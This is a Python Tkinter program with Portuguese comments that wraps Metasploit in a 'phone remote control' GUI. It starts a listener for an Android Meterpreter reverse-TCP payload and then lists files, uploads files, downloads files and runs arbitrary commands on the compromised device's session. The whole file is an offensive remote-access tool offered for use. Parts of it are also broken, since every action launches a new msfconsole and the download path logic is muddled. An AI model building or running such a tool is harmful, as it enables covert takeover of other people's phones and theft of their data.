import tkinter as tk
from tkinter import messagebox, filedialog
import os
import subprocess
import threading

# Função para iniciar o listener do Metasploit
def start_listener():
    lhost = entry_lhost.get()
    lport = entry_lport.get()

    # Verificando se os campos LHOST e LPORT não estão vazios
    if not lhost or not lport:
        messagebox.showerror("Erro", "LHOST e LPORT são obrigatórios")
        return

    # Inicia o listener em um thread para não bloquear a interface gráfica
    threading.Thread(target=run_msf_listener, args=(lhost, lport), daemon=True).start()

def run_msf_listener(lhost, lport):
    # Comando para iniciar o listener do Metasploit
    listener_command = f"msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'"
    subprocess.call(listener_command, shell=True)

    messagebox.showinfo("Listener", "Listener iniciado. Aguardando conexão do dispositivo...")

# Função para mostrar a lista de arquivos do dispositivo
def show_files():
    # Verifica se uma sessão meterpreter está ativa
    subprocess.call("msfconsole -x 'sessions -i 1; ls'", shell=True)

# Função para enviar arquivo para o dispositivo
def send_file():
    file_path = filedialog.askopenfilename(title="Selecione o arquivo para enviar")
    if file_path:
        # Comando para enviar o arquivo via meterpreter
        subprocess.call(f"msfconsole -x 'sessions -i 1; upload {file_path} /data/data/com.termux/files/home/'", shell=True)

# Função para baixar arquivo do dispositivo
def download_file():
    file_path = filedialog.askopenfilename(title="Selecione o local para salvar o arquivo")
    if file_path:
        # Comando para baixar o arquivo via meterpreter
        subprocess.call(f"msfconsole -x 'sessions -i 1; download /data/data/com.termux/files/home/{file_path} {file_path}'", shell=True)

# Função para abrir e executar comandos no meterpreter
def execute_meterpreter_command():
    command = entry_command.get()
    if command:
        # Envia o comando para o meterpreter
        subprocess.call(f"msfconsole -x 'sessions -i 1; {command}'", shell=True)

# Criando a janela principal
root = tk.Tk()
root.title("Controle Remoto do Celular")

# Layout
frame = tk.Frame(root)
frame.pack(padx=10, pady=10)

# Labels e campos de entrada para LHOST e LPORT
label_lhost = tk.Label(frame, text="LHOST (IP do computador):")
label_lhost.grid(row=0, column=0, sticky="e", pady=5)
entry_lhost = tk.Entry(frame)
entry_lhost.grid(row=0, column=1, pady=5)

label_lport = tk.Label(frame, text="LPORT (Porta):")
label_lport.grid(row=1, column=0, sticky="e", pady=5)
entry_lport = tk.Entry(frame)
entry_lport.grid(row=1, column=1, pady=5)

# Botões
btn_start_listener = tk.Button(frame, text="Iniciar Listener", command=start_listener)
btn_start_listener.grid(row=2, column=0, columnspan=2, pady=10)

btn_show_files = tk.Button(frame, text="Mostrar Arquivos", command=show_files)
btn_show_files.grid(row=3, column=0, columnspan=2, pady=5)

btn_send_file = tk.Button(frame, text="Enviar Arquivo", command=send_file)
btn_send_file.grid(row=4, column=0, columnspan=2, pady=5)

btn_download_file = tk.Button(frame, text="Baixar Arquivo", command=download_file)
btn_download_file.grid(row=5, column=0, columnspan=2, pady=5)

# Entrada para comandos do meterpreter
label_command = tk.Label(frame, text="Comando Meterpreter:")
label_command.grid(row=6, column=0, sticky="e", pady=5)
entry_command = tk.Entry(frame)
entry_command.grid(row=6, column=1, pady=5)

btn_execute_command = tk.Button(frame, text="Executar Comando", command=execute_meterpreter_command)
btn_execute_command.grid(row=7, column=0, columnspan=2, pady=5)

# Inicia a interface gráfica
root.mainloop()
